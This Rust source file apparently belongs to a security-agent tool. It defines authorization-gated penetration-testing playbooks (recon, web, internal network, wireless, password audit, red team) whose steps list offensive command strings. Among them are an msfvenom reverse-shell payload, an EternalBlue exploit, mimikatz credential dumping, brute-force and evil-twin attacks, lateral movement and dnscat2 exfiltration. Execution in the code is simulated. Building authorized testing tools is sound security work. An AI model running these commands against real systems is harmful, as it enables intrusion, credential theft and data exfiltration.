//! Security Playbooks System
//!
//! Automated penetration testing workflows and security assessment playbooks.
//! Implements common offensive security methodologies like PTES, OWASP, and NIST.

use crate::{SecurityAgentError, SecurityGate, SecurityLevel};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use uuid::Uuid;

/// Playbook execution engine
pub struct PlaybookEngine {
    security_gate: Arc<RwLock<SecurityGate>>,
    playbooks: HashMap<String, Playbook>,
}

impl PlaybookEngine {
    /// Create a new playbook engine
    pub fn new(security_gate: Arc<RwLock<SecurityGate>>) -> Self {
        let mut engine = Self {
            security_gate,
            playbooks: HashMap::new(),
        };
        engine.load_playbooks();
        engine
    }

    /// Load built-in playbooks
    fn load_playbooks(&mut self) {
        // Network Reconnaissance Playbook
        self.playbooks.insert(
            "network-recon".to_string(),
            Playbook {
                id: "network-recon".to_string(),
                name: "Network Reconnaissance".to_string(),
                description: "Comprehensive network discovery and enumeration".to_string(),
                category: PlaybookCategory::Reconnaissance,
                required_level: SecurityLevel::Active,
                methodology: "PTES".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Passive Information Gathering".to_string(),
                        description: "Gather publicly available information about the target".to_string(),
                        commands: vec![
                            "whois {target}".to_string(),
                            "dig {target} ANY".to_string(),
                            "nslookup -type=any {target}".to_string(),
                        ],
                        tools: vec!["whois".to_string(), "dig".to_string(), "nslookup".to_string()],
                        expected_output: "Domain registration, DNS records, nameservers".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Host Discovery".to_string(),
                        description: "Identify live hosts on the network".to_string(),
                        commands: vec![
                            "nmap -sn {target}".to_string(),
                            "nmap -PE -PM -PP {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "List of live hosts with IP addresses".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "Port Scanning".to_string(),
                        description: "Identify open ports and services".to_string(),
                        commands: vec![
                            "nmap -sS -sV -O -p- {target}".to_string(),
                            "nmap -sU --top-ports 100 {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "Open ports, service versions, OS detection".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "Service Enumeration".to_string(),
                        description: "Detailed enumeration of discovered services".to_string(),
                        commands: vec![
                            "nmap -sC -sV -p{ports} {target}".to_string(),
                            "nmap --script=banner {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "Service banners, version details, vulnerabilities".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                ],
                mitre_techniques: vec!["T1046".to_string(), "T1018".to_string(), "T1589".to_string()],
                estimated_duration_mins: 30,
            },
        );

        // Web Application Assessment Playbook
        self.playbooks.insert(
            "web-app-assessment".to_string(),
            Playbook {
                id: "web-app-assessment".to_string(),
                name: "Web Application Security Assessment".to_string(),
                description: "OWASP-based web application security testing".to_string(),
                category: PlaybookCategory::WebApplication,
                required_level: SecurityLevel::Active,
                methodology: "OWASP".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Technology Fingerprinting".to_string(),
                        description: "Identify web technologies and frameworks".to_string(),
                        commands: vec![
                            "whatweb {target}".to_string(),
                            "wappalyzer {target}".to_string(),
                        ],
                        tools: vec!["whatweb".to_string(), "wappalyzer".to_string()],
                        expected_output: "Web server, CMS, frameworks, libraries".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Directory Enumeration".to_string(),
                        description: "Discover hidden directories and files".to_string(),
                        commands: vec![
                            "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt".to_string(),
                            "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt".to_string(),
                        ],
                        tools: vec!["gobuster".to_string(), "ffuf".to_string()],
                        expected_output: "Hidden directories, backup files, admin panels".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "Vulnerability Scanning".to_string(),
                        description: "Automated vulnerability scanning".to_string(),
                        commands: vec![
                            "nikto -h {target}".to_string(),
                            "nuclei -u {target} -t cves/".to_string(),
                        ],
                        tools: vec!["nikto".to_string(), "nuclei".to_string()],
                        expected_output: "Known vulnerabilities, misconfigurations".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "SQL Injection Testing".to_string(),
                        description: "Test for SQL injection vulnerabilities".to_string(),
                        commands: vec![
                            "sqlmap -u {target} --batch --crawl=2".to_string(),
                        ],
                        tools: vec!["sqlmap".to_string()],
                        expected_output: "SQL injection points, database information".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 5,
                        name: "XSS Testing".to_string(),
                        description: "Test for Cross-Site Scripting vulnerabilities".to_string(),
                        commands: vec![
                            "dalfox url {target} --skip-bav".to_string(),
                        ],
                        tools: vec!["dalfox".to_string()],
                        expected_output: "XSS vulnerabilities, payload effectiveness".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                ],
                mitre_techniques: vec!["T1190".to_string(), "T1059".to_string()],
                estimated_duration_mins: 60,
            },
        );

        // Internal Network Penetration Test Playbook
        self.playbooks.insert(
            "internal-pentest".to_string(),
            Playbook {
                id: "internal-pentest".to_string(),
                name: "Internal Network Penetration Test".to_string(),
                description: "Comprehensive internal network security assessment".to_string(),
                category: PlaybookCategory::InternalNetwork,
                required_level: SecurityLevel::Exploit,
                methodology: "PTES".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Network Discovery".to_string(),
                        description: "Map the internal network".to_string(),
                        commands: vec![
                            "nmap -sn {target}".to_string(),
                            "arp-scan -l".to_string(),
                            "netdiscover -r {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string(), "arp-scan".to_string(), "netdiscover".to_string()],
                        expected_output: "Network map, live hosts, MAC addresses".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Service Enumeration".to_string(),
                        description: "Enumerate services on discovered hosts".to_string(),
                        commands: vec![
                            "nmap -sV -sC -O -p- {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "Services, versions, OS information".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "SMB Enumeration".to_string(),
                        description: "Enumerate SMB shares and users".to_string(),
                        commands: vec![
                            "enum4linux -a {target}".to_string(),
                            "smbclient -L //{target} -N".to_string(),
                            "crackmapexec smb {target} --shares".to_string(),
                        ],
                        tools: vec!["enum4linux".to_string(), "smbclient".to_string(), "crackmapexec".to_string()],
                        expected_output: "Shares, users, groups, policies".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "LDAP Enumeration".to_string(),
                        description: "Enumerate Active Directory via LDAP".to_string(),
                        commands: vec![
                            "ldapsearch -x -H ldap://{target} -b 'dc=domain,dc=local'".to_string(),
                            "bloodhound-python -d domain.local -u user -p pass -ns {target} -c all".to_string(),
                        ],
                        tools: vec!["ldapsearch".to_string(), "bloodhound".to_string()],
                        expected_output: "AD structure, users, groups, GPOs".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 5,
                        name: "Vulnerability Assessment".to_string(),
                        description: "Scan for known vulnerabilities".to_string(),
                        commands: vec![
                            "nmap --script vuln {target}".to_string(),
                            "nessus scan {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string(), "nessus".to_string()],
                        expected_output: "CVEs, exploitable vulnerabilities".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 6,
                        name: "Credential Attacks".to_string(),
                        description: "Test for weak credentials".to_string(),
                        commands: vec![
                            "crackmapexec smb {target} -u users.txt -p passwords.txt".to_string(),
                            "hydra -L users.txt -P passwords.txt {target} ssh".to_string(),
                        ],
                        tools: vec!["crackmapexec".to_string(), "hydra".to_string()],
                        expected_output: "Valid credentials, password policy weaknesses".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 7,
                        name: "Exploitation".to_string(),
                        description: "Exploit discovered vulnerabilities".to_string(),
                        commands: vec![
                            "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run'".to_string(),
                        ],
                        tools: vec!["metasploit".to_string()],
                        expected_output: "Shell access, privilege escalation paths".to_string(),
                        risk_level: "Critical".to_string(),
                    },
                ],
                mitre_techniques: vec![
                    "T1046".to_string(), "T1018".to_string(), "T1087".to_string(),
                    "T1110".to_string(), "T1210".to_string(), "T1021".to_string(),
                ],
                estimated_duration_mins: 240,
            },
        );

        // Wireless Security Assessment Playbook
        self.playbooks.insert(
            "wireless-assessment".to_string(),
            Playbook {
                id: "wireless-assessment".to_string(),
                name: "Wireless Security Assessment".to_string(),
                description: "WiFi network security testing".to_string(),
                category: PlaybookCategory::Wireless,
                required_level: SecurityLevel::Active,
                methodology: "PTES".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Wireless Discovery".to_string(),
                        description: "Discover wireless networks".to_string(),
                        commands: vec![
                            "airodump-ng wlan0".to_string(),
                            "iwlist wlan0 scan".to_string(),
                        ],
                        tools: vec!["aircrack-ng".to_string()],
                        expected_output: "SSIDs, BSSIDs, channels, encryption types".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Client Discovery".to_string(),
                        description: "Identify connected clients".to_string(),
                        commands: vec![
                            "airodump-ng -c {channel} --bssid {bssid} wlan0".to_string(),
                        ],
                        tools: vec!["aircrack-ng".to_string()],
                        expected_output: "Connected clients, MAC addresses".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "WPA Handshake Capture".to_string(),
                        description: "Capture WPA handshake for offline cracking".to_string(),
                        commands: vec![
                            "airodump-ng -c {channel} --bssid {bssid} -w capture wlan0".to_string(),
                            "aireplay-ng -0 1 -a {bssid} -c {client} wlan0".to_string(),
                        ],
                        tools: vec!["aircrack-ng".to_string()],
                        expected_output: "WPA handshake capture file".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "Password Cracking".to_string(),
                        description: "Attempt to crack captured handshake".to_string(),
                        commands: vec![
                            "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap".to_string(),
                            "hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt".to_string(),
                        ],
                        tools: vec!["aircrack-ng".to_string(), "hashcat".to_string()],
                        expected_output: "WiFi password (if weak)".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 5,
                        name: "Evil Twin Attack".to_string(),
                        description: "Create rogue access point".to_string(),
                        commands: vec![
                            "hostapd-wpe hostapd.conf".to_string(),
                        ],
                        tools: vec!["hostapd-wpe".to_string()],
                        expected_output: "Captured credentials from connecting clients".to_string(),
                        risk_level: "Critical".to_string(),
                    },
                ],
                mitre_techniques: vec!["T1557".to_string(), "T1040".to_string(), "T1110".to_string()],
                estimated_duration_mins: 120,
            },
        );

        // Password Audit Playbook
        self.playbooks.insert(
            "password-audit".to_string(),
            Playbook {
                id: "password-audit".to_string(),
                name: "Password Security Audit".to_string(),
                description: "Comprehensive password strength assessment".to_string(),
                category: PlaybookCategory::CredentialTesting,
                required_level: SecurityLevel::Active,
                methodology: "NIST".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Hash Extraction".to_string(),
                        description: "Extract password hashes from systems".to_string(),
                        commands: vec![
                            "secretsdump.py domain/user:pass@{target}".to_string(),
                            "mimikatz 'sekurlsa::logonpasswords'".to_string(),
                        ],
                        tools: vec!["impacket".to_string(), "mimikatz".to_string()],
                        expected_output: "NTLM hashes, Kerberos tickets".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Dictionary Attack".to_string(),
                        description: "Test against common passwords".to_string(),
                        commands: vec![
                            "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt".to_string(),
                            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt".to_string(),
                        ],
                        tools: vec!["hashcat".to_string(), "john".to_string()],
                        expected_output: "Cracked passwords".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "Rule-Based Attack".to_string(),
                        description: "Apply mutation rules to wordlists".to_string(),
                        commands: vec![
                            "hashcat -m 1000 -r /usr/share/hashcat/rules/best64.rule hashes.txt wordlist.txt".to_string(),
                        ],
                        tools: vec!["hashcat".to_string()],
                        expected_output: "Additional cracked passwords".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "Mask Attack".to_string(),
                        description: "Brute force with pattern masks".to_string(),
                        commands: vec![
                            "hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d".to_string(),
                        ],
                        tools: vec!["hashcat".to_string()],
                        expected_output: "Pattern-based cracked passwords".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                ],
                mitre_techniques: vec!["T1110".to_string(), "T1552".to_string()],
                estimated_duration_mins: 180,
            },
        );

        // Quick Vulnerability Scan Playbook
        self.playbooks.insert(
            "quick-vuln-scan".to_string(),
            Playbook {
                id: "quick-vuln-scan".to_string(),
                name: "Quick Vulnerability Scan".to_string(),
                description: "Fast vulnerability assessment for time-sensitive situations".to_string(),
                category: PlaybookCategory::VulnerabilityAssessment,
                required_level: SecurityLevel::Active,
                methodology: "NIST".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Fast Port Scan".to_string(),
                        description: "Quick scan of common ports".to_string(),
                        commands: vec![
                            "nmap -sV --top-ports 100 -T4 {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "Open ports and services".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Vulnerability Scripts".to_string(),
                        description: "Run nmap vulnerability scripts".to_string(),
                        commands: vec![
                            "nmap --script vuln -p{ports} {target}".to_string(),
                        ],
                        tools: vec!["nmap".to_string()],
                        expected_output: "Known vulnerabilities".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "CVE Check".to_string(),
                        description: "Check for critical CVEs".to_string(),
                        commands: vec![
                            "nuclei -u {target} -t cves/ -severity critical,high".to_string(),
                        ],
                        tools: vec!["nuclei".to_string()],
                        expected_output: "Critical and high severity CVEs".to_string(),
                        risk_level: "Medium".to_string(),
                    },
                ],
                mitre_techniques: vec!["T1046".to_string()],
                estimated_duration_mins: 15,
            },
        );

        // Red Team Playbook
        self.playbooks.insert(
            "red-team-engagement".to_string(),
            Playbook {
                id: "red-team-engagement".to_string(),
                name: "Red Team Engagement".to_string(),
                description: "Full adversary simulation engagement".to_string(),
                category: PlaybookCategory::RedTeam,
                required_level: SecurityLevel::Offensive,
                methodology: "MITRE ATT&CK".to_string(),
                steps: vec![
                    PlaybookStep {
                        id: 1,
                        name: "Reconnaissance".to_string(),
                        description: "Gather intelligence on target organization".to_string(),
                        commands: vec![
                            "theHarvester -d {domain} -b all".to_string(),
                            "amass enum -d {domain}".to_string(),
                            "subfinder -d {domain}".to_string(),
                        ],
                        tools: vec!["theHarvester".to_string(), "amass".to_string(), "subfinder".to_string()],
                        expected_output: "Emails, subdomains, employee names".to_string(),
                        risk_level: "Low".to_string(),
                    },
                    PlaybookStep {
                        id: 2,
                        name: "Initial Access".to_string(),
                        description: "Gain initial foothold".to_string(),
                        commands: vec![
                            "gophish campaign".to_string(),
                            "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe -o payload.exe".to_string(),
                        ],
                        tools: vec!["gophish".to_string(), "metasploit".to_string()],
                        expected_output: "Initial access to target network".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 3,
                        name: "Persistence".to_string(),
                        description: "Establish persistent access".to_string(),
                        commands: vec![
                            "covenant listener".to_string(),
                            "sliver implant".to_string(),
                        ],
                        tools: vec!["covenant".to_string(), "sliver".to_string()],
                        expected_output: "Persistent backdoor access".to_string(),
                        risk_level: "Critical".to_string(),
                    },
                    PlaybookStep {
                        id: 4,
                        name: "Privilege Escalation".to_string(),
                        description: "Escalate privileges on compromised systems".to_string(),
                        commands: vec![
                            "winPEAS.exe".to_string(),
                            "linPEAS.sh".to_string(),
                            "PowerUp.ps1".to_string(),
                        ],
                        tools: vec!["PEASS".to_string(), "PowerUp".to_string()],
                        expected_output: "Elevated privileges".to_string(),
                        risk_level: "High".to_string(),
                    },
                    PlaybookStep {
                        id: 5,
                        name: "Lateral Movement".to_string(),
                        description: "Move through the network".to_string(),
                        commands: vec![
                            "crackmapexec smb {target} -u user -p pass --sam".to_string(),
                            "psexec.py domain/user:pass@{target}".to_string(),
                        ],
                        tools: vec!["crackmapexec".to_string(), "impacket".to_string()],
                        expected_output: "Access to additional systems".to_string(),
                        risk_level: "Critical".to_string(),
                    },
                    PlaybookStep {
                        id: 6,
                        name: "Data Exfiltration".to_string(),
                        description: "Demonstrate data exfiltration capability".to_string(),
                        commands: vec![
                            "dnscat2 server".to_string(),
                        ],
                        tools: vec!["dnscat2".to_string()],
                        expected_output: "Proof of data exfiltration".to_string(),
                        risk_level: "Critical".to_string(),
                    },
                ],
                mitre_techniques: vec![
                    "T1589".to_string(), "T1566".to_string(), "T1505".to_string(),
                    "T1068".to_string(), "T1021".to_string(), "T1048".to_string(),
                ],
                estimated_duration_mins: 480,
            },
        );
    }

    /// Execute a playbook
    pub async fn execute(
        &self,
        playbook_name: &str,
        target: &str,
    ) -> Result<PlaybookResult, SecurityAgentError> {
        let playbook = self.playbooks.get(playbook_name).ok_or_else(|| {
            SecurityAgentError::Configuration(format!("Playbook '{}' not found", playbook_name))
        })?;

        // Check authorization
        let gate = self.security_gate.read().await;
        gate.check_authorization(playbook.required_level, Some(target))?;
        drop(gate);

        println!("📋 Executing playbook: {}", playbook.name);
        println!("   Target: {}", target);
        println!("   Methodology: {}", playbook.methodology);
        println!("   Estimated duration: {} minutes", playbook.estimated_duration_mins);

        let started_at = Utc::now();
        let mut step_results = Vec::new();

        for step in &playbook.steps {
            println!("\n   Step {}: {}", step.id, step.name);
            println!("   Description: {}", step.description);
            println!("   Risk Level: {}", step.risk_level);

            // In a real implementation, this would execute the commands
            // For now, we simulate the execution
            let step_result = StepResult {
                step_id: step.id,
                step_name: step.name.clone(),
                status: StepStatus::Completed,
                output: format!("Simulated output for step: {}", step.name),
                findings: Vec::new(),
                duration_secs: 10,
            };

            step_results.push(step_result);
        }

        let completed_at = Utc::now();

        Ok(PlaybookResult {
            id: Uuid::new_v4(),
            playbook_id: playbook.id.clone(),
            playbook_name: playbook.name.clone(),
            target: target.to_string(),
            started_at,
            completed_at,
            status: PlaybookStatus::Completed,
            step_results,
            summary: format!(
                "Playbook '{}' completed successfully against target '{}'",
                playbook.name, target
            ),
            recommendations: vec![
                "Review all findings and prioritize remediation".to_string(),
                "Implement recommended mitigations".to_string(),
                "Schedule follow-up assessment".to_string(),
            ],
        })
    }

    /// List available playbooks
    pub fn list_playbooks(&self) -> Vec<PlaybookInfo> {
        self.playbooks
            .values()
            .map(|p| PlaybookInfo {
                id: p.id.clone(),
                name: p.name.clone(),
                description: p.description.clone(),
                category: p.category.clone(),
                required_level: p.required_level,
                methodology: p.methodology.clone(),
                step_count: p.steps.len(),
                estimated_duration_mins: p.estimated_duration_mins,
            })
            .collect()
    }

    /// Get playbook details
    pub fn get_playbook(&self, id: &str) -> Option<&Playbook> {
        self.playbooks.get(id)
    }

    /// Create a custom playbook
    pub fn create_playbook(&mut self, playbook: Playbook) -> Result<(), SecurityAgentError> {
        if self.playbooks.contains_key(&playbook.id) {
            return Err(SecurityAgentError::Configuration(format!(
                "Playbook '{}' already exists",
                playbook.id
            )));
        }
        self.playbooks.insert(playbook.id.clone(), playbook);
        Ok(())
    }
}

/// Security playbook definition
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Playbook {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: PlaybookCategory,
    pub required_level: SecurityLevel,
    pub methodology: String,
    pub steps: Vec<PlaybookStep>,
    pub mitre_techniques: Vec<String>,
    pub estimated_duration_mins: u32,
}

/// Playbook step
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlaybookStep {
    pub id: u32,
    pub name: String,
    pub description: String,
    pub commands: Vec<String>,
    pub tools: Vec<String>,
    pub expected_output: String,
    pub risk_level: String,
}

/// Playbook category
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum PlaybookCategory {
    Reconnaissance,
    WebApplication,
    InternalNetwork,
    ExternalNetwork,
    Wireless,
    SocialEngineering,
    PhysicalSecurity,
    CredentialTesting,
    VulnerabilityAssessment,
    RedTeam,
    Custom,
}

/// Playbook execution result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlaybookResult {
    pub id: Uuid,
    pub playbook_id: String,
    pub playbook_name: String,
    pub target: String,
    pub started_at: DateTime<Utc>,
    pub completed_at: DateTime<Utc>,
    pub status: PlaybookStatus,
    pub step_results: Vec<StepResult>,
    pub summary: String,
    pub recommendations: Vec<String>,
}

/// Playbook execution status
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum PlaybookStatus {
    Pending,
    Running,
    Completed,
    Failed,
    Aborted,
}

/// Step execution result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StepResult {
    pub step_id: u32,
    pub step_name: String,
    pub status: StepStatus,
    pub output: String,
    pub findings: Vec<String>,
    pub duration_secs: u64,
}

/// Step execution status
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum StepStatus {
    Pending,
    Running,
    Completed,
    Failed,
    Skipped,
}

/// Playbook info for listing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlaybookInfo {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: PlaybookCategory,
    pub required_level: SecurityLevel,
    pub methodology: String,
    pub step_count: usize,
    pub estimated_duration_mins: u32,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_playbook_engine_creation() {
        let gate = Arc::new(RwLock::new(SecurityGate::new()));
        let engine = PlaybookEngine::new(gate);
        assert!(!engine.playbooks.is_empty());
    }

    #[test]
    fn test_list_playbooks() {
        let gate = Arc::new(RwLock::new(SecurityGate::new()));
        let engine = PlaybookEngine::new(gate);
        let playbooks = engine.list_playbooks();
        assert!(!playbooks.is_empty());
    }

    #[test]
    fn test_get_playbook() {
        let gate = Arc::new(RwLock::new(SecurityGate::new()));
        let engine = PlaybookEngine::new(gate);
        let playbook = engine.get_playbook("network-recon");
        assert!(playbook.is_some());
    }
}
